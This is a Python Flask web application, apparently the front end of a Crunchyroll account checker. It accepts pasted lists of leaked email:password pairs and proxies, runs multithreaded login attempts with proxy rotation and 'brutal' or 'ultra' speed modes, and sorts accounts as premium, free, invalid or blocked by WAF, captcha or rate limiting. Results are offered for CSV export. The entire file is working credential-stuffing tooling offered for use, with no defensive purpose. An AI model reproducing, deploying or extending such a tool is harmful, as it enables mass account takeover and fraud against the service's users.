import os
import sys
import uuid
import threading
import io
import csv
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

sys.path.insert(0, os.path.dirname(__file__))
from gug import CrunchyrollChecker, ProxyManager, StatsTracker, is_valid_email, is_blacklisted_domain

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)


def create_app():
    app = Flask(__name__)
    app.secret_key = os.environ.get('SECRET_KEY', os.urandom(32).hex())
    app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024
    
    CORS(app)
    
    limiter = Limiter(
        key_func=get_remote_address,
        app=app,
        default_limits=["200 per day", "50 per hour"],
        storage_uri="memory://"
    )
    
    jobs = {}
    jobs_lock = threading.Lock()
    
    JOB_CLEANUP_HOURS = 24
    
    @app.after_request
    def add_security_headers(response):
        response.headers['X-Content-Type-Options'] = 'nosniff'
        response.headers['X-Frame-Options'] = 'SAMEORIGIN'
        response.headers['X-XSS-Protection'] = '1; mode=block'
        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
        return response
    
    def get_job_by_id(job_id):
        with jobs_lock:
            return jobs.get(job_id)
    
    def set_job(job_id, job_data):
        with jobs_lock:
            jobs[job_id] = job_data
    
    def delete_job(job_id):
        with jobs_lock:
            if job_id in jobs:
                del jobs[job_id]
    
    def get_job_id_from_request():
        job_id = request.args.get('job_id') or request.headers.get('X-Job-ID')
        if not job_id and request.is_json:
            data = request.get_json(silent=True)
            if data:
                job_id = data.get('job_id')
        return job_id
    
    def cleanup_old_jobs():
        with jobs_lock:
            now = datetime.now()
            expired = []
            for jid, job in jobs.items():
                started = job.get('started_at')
                if started:
                    try:
                        start_time = datetime.fromisoformat(started)
                        hours_old = (now - start_time).total_seconds() / 3600
                        if hours_old > JOB_CLEANUP_HOURS and not job.get('is_running'):
                            expired.append(jid)
                    except:
                        pass
            for jid in expired:
                del jobs[jid]
            if expired:
                logger.info(f"Cleaned up {len(expired)} old jobs")
    
    @app.route('/')
    def index():
        return render_template('index.html')
    
    @app.route('/api/check', methods=['POST'])
    @limiter.limit("10 per minute")
    def check_accounts():
        try:
            data = request.json
            if not data:
                return jsonify({'error': 'Invalid request data'}), 400
        except Exception as e:
            logger.error(f"JSON parse error: {e}")
            return jsonify({'error': 'Invalid JSON data'}), 400
        
        combos_text = data.get('combos', '').strip()
        proxies_text = data.get('proxies', '').strip()
        use_brutal = bool(data.get('brutal_mode', False))
        use_ultra = bool(data.get('ultra_mode', False))
        validate_proxies = bool(data.get('validate_proxies', False))
        
        if not combos_text:
            return jsonify({'error': 'No combos provided'}), 400
        
        combos = [line.strip() for line in combos_text.split('\n') if ':' in line.strip()]
        if not combos:
            return jsonify({'error': 'No valid combos found (format: email:password)'}), 400
        
        
        valid_combos = []
        for combo in combos:
            parts = combo.split(':', 1)
            if len(parts) != 2:
                continue
            email, password = parts
            email = email.strip()
            password = password.strip()
            if is_valid_email(email) and not is_blacklisted_domain(email) and len(password) >= 1:
                valid_combos.append((email, password))
        
        if not valid_combos:
            return jsonify({'error': 'All combos are invalid or blacklisted'}), 400
        
        proxy_list = []
        if proxies_text:
            proxy_lines = [p.strip() for p in proxies_text.split('\n') if p.strip() and not p.startswith('#')]
            proxy_list = proxy_lines
        
        cleanup_old_jobs()
        
        job_id = str(uuid.uuid4())
        job_data = {
            'job_id': job_id,
            'is_running': True,
            'stats': StatsTracker(len(valid_combos)),
            'results': [],
            'current_combo': '',
            'progress': 0,
            'error': None,
            'started_at': datetime.now().isoformat(),
            'total_combos': len(valid_combos)
        }
        set_job(job_id, job_data)
        
        logger.info(f"Starting job {job_id[:8]}... with {len(valid_combos)} combos")
        
        def run_check():
            try:
                proxy_mgr = ProxyManager()
                
                if proxy_list:
                    for proxy in proxy_list:
                        parsed = proxy_mgr._parse_proxy(proxy)
                        if parsed:
                            proxy_mgr.proxies.append(parsed)
                    if proxy_mgr.proxies:
                        proxy_mgr.use_proxies = True
                        proxy_mgr.proxies = list(set(proxy_mgr.proxies))
                        logger.info(f"Job {job_id[:8]}: Loaded {len(proxy_mgr.proxies)} proxies")
                        
                        if validate_proxies:
                            logger.info(f"Job {job_id[:8]}: Validating proxies...")
                            proxy_mgr.validate_proxies(max_threads=10, timeout=5)
                
                checker = CrunchyrollChecker(
                    proxy_manager=proxy_mgr,
                    brutal_mode=use_brutal,
                    ultra_mode=use_ultra,
                    skip_optional=True
                )
                
                num_threads = 5 if use_ultra else (3 if use_brutal else 2)
                logger.info(f"Job {job_id[:8]}: Using {num_threads} threads for {len(valid_combos)} combos")
                
                def check_single(combo_data):
                    idx, (email, password) = combo_data
                    try:
                        if proxy_mgr.use_proxies and checker.proxy_manager:
                            checker.current_proxy = checker.proxy_manager.rotate_proxy()
                        result = checker.login(email, password)
                        status = 'error'
                        
                        if isinstance(result, dict):
                            if 'access_token' in result:
                                status = 'premium'
                            elif 'error' in result:
                                error_type = result.get('error', '')
                                if error_type in ['waf_blocked', 'captcha_required', 'rate_limited']:
                                    status = 'blocked'
                                else:
                                    status = 'invalid'
                            else:
                                status = 'free'
                        
                        return (email, status)
                    except Exception as e:
                        logger.error(f"Job {job_id[:8]}: Error checking {email}: {e}")
                        return (email, 'error')
                
                with ThreadPoolExecutor(max_workers=num_threads) as executor:
                    futures = {executor.submit(check_single, (idx, combo)): idx for idx, combo in enumerate(valid_combos)}
                    
                    for future in as_completed(futures):
                        current_job = get_job_by_id(job_id)
                        if not current_job or not current_job.get('is_running'):
                            logger.info(f"Job {job_id[:8]}: Stopped by user")
                            break
                        
                        try:
                            email, status = future.result()
                            with jobs_lock:
                                if job_id in jobs:
                                    processed_count = len(jobs[job_id]['results'])
                                    jobs[job_id]['results'].append({
                                        'email': email,
                                        'status': status,
                                        'timestamp': datetime.now().isoformat()
                                    })
                                    jobs[job_id]['stats'].record_check(status)
                                    jobs[job_id]['progress'] = int((processed_count / len(valid_combos)) * 100)
                                    jobs[job_id]['current_combo'] = email
                        except Exception as e:
                            logger.error(f"Job {job_id[:8]}: Thread error: {e}")
                
                logger.info(f"Job {job_id[:8]}: Completed")
            
            except Exception as e:
                logger.error(f"Job {job_id[:8]}: Fatal error: {e}")
                with jobs_lock:
                    if job_id in jobs:
                        jobs[job_id]['error'] = str(e)
            
            finally:
                with jobs_lock:
                    if job_id in jobs:
                        jobs[job_id]['is_running'] = False
                        jobs[job_id]['progress'] = 100
        
        thread = threading.Thread(target=run_check, daemon=True)
        thread.start()
        
        return jsonify({
            'message': 'Checking started',
            'job_id': job_id,
            'total_combos': len(valid_combos)
        }), 200
    
    @app.route('/api/status')
    @limiter.limit("60 per minute")
    def get_status():
        job_id = get_job_id_from_request()
        
        if not job_id:
            return jsonify({
                'error': 'No job_id provided',
                'is_running': False,
                'progress': 0,
                'current': '',
                'results_count': 0,
                'stats': {
                    'checked': 0, 'premium': 0, 'free': 0,
                    'invalid': 0, 'blocked': 0, 'cpm': 0, 'eta': 'N/A'
                }
            })
        
        job = get_job_by_id(job_id)
        
        if not job:
            return jsonify({
                'error': 'Job not found',
                'is_running': False,
                'progress': 0,
                'current': '',
                'results_count': 0,
                'stats': {
                    'checked': 0, 'premium': 0, 'free': 0,
                    'invalid': 0, 'blocked': 0, 'cpm': 0, 'eta': 'N/A'
                }
            })
        
        stats = job.get('stats')
        return jsonify({
            'is_running': job.get('is_running', False),
            'progress': job.get('progress', 0),
            'current': job.get('current_combo', ''),
            'results_count': len(job.get('results', [])),
            'error': job.get('error'),
            'job_id': job.get('job_id'),
            'total_combos': job.get('total_combos', 0),
            'stats': {
                'checked': stats.checked if stats else 0,
                'premium': stats.premium if stats else 0,
                'free': stats.free if stats else 0,
                'invalid': stats.invalid if stats else 0,
                'blocked': stats.blocked if stats else 0,
                'cpm': round(stats.get_cpm(), 1) if stats else 0,
                'eta': stats.get_eta() if stats else 'N/A',
            }
        })
    
    @app.route('/api/results')
    @limiter.limit("30 per minute")
    def get_results():
        job_id = get_job_id_from_request()
        
        if not job_id:
            return jsonify({'error': 'No job_id provided', 'results': [], 'total': 0})
        
        job = get_job_by_id(job_id)
        
        if not job:
            return jsonify({'error': 'Job not found', 'results': [], 'total': 0})
        
        return jsonify({
            'results': job.get('results', []),
            'total': len(job.get('results', []))
        })
    
    @app.route('/api/export')
    @limiter.limit("10 per minute")
    def export_results():
        job_id = get_job_id_from_request()
        
        if not job_id:
            return jsonify({'error': 'No job_id provided'}), 400
        
        job = get_job_by_id(job_id)
        
        if not job:
            return jsonify({'error': 'Job not found'}), 404
        
        results = job.get('results', [])
        if not results:
            return jsonify({'error': 'No results to export'}), 400
        
        export_format = request.args.get('format', 'csv')
        
        if export_format == 'csv':
            output = io.StringIO()
            writer = csv.DictWriter(output, fieldnames=['email', 'status', 'timestamp'])
            writer.writeheader()
            writer.writerows(results)
            
            return send_file(
                io.BytesIO(output.getvalue().encode()),
                mimetype='text/csv',
                as_attachment=True,
                download_name=f'results_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'
            )
        
        return jsonify(results), 200
    
    @app.route('/api/stop', methods=['POST'])
    @limiter.limit("20 per minute")
    def stop_checking():
        job_id = get_job_id_from_request()
        
        if not job_id:
            return jsonify({'error': 'No job_id provided'}), 400
        
        job = get_job_by_id(job_id)
        
        if job:
            with jobs_lock:
                if job_id in jobs:
                    jobs[job_id]['is_running'] = False
            logger.info(f"Job {job_id[:8]}: Stopped by user")
            return jsonify({'message': 'Stopping checker'}), 200
        
        return jsonify({'error': 'Job not found'}), 404
    
    @app.route('/api/clear', methods=['POST'])
    @limiter.limit("10 per minute")
    def clear_results():
        job_id = get_job_id_from_request()
        
        if not job_id:
            return jsonify({'error': 'No job_id provided'}), 400
        
        delete_job(job_id)
        return jsonify({'message': 'Results cleared'}), 200
    
    @app.route('/health')
    def health_check():
        with jobs_lock:
            active_jobs = sum(1 for j in jobs.values() if j.get('is_running'))
            total_jobs = len(jobs)
        return jsonify({
            'status': 'healthy',
            'timestamp': datetime.now().isoformat(),
            'active_jobs': active_jobs,
            'total_jobs': total_jobs
        }), 200
    
    @app.errorhandler(429)
    def ratelimit_handler(e):
        return jsonify({'error': 'Rate limit exceeded. Please slow down.'}), 429
    
    @app.errorhandler(500)
    def internal_error(e):
        logger.error(f"Internal server error: {e}")
        return jsonify({'error': 'Internal server error'}), 500
    
    @app.errorhandler(404)
    def not_found(e):
        return jsonify({'error': 'Not found'}), 404
    
    return app


app = create_app()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('FLASK_ENV') != 'production'
    app.run(host='0.0.0.0', port=port, debug=debug)
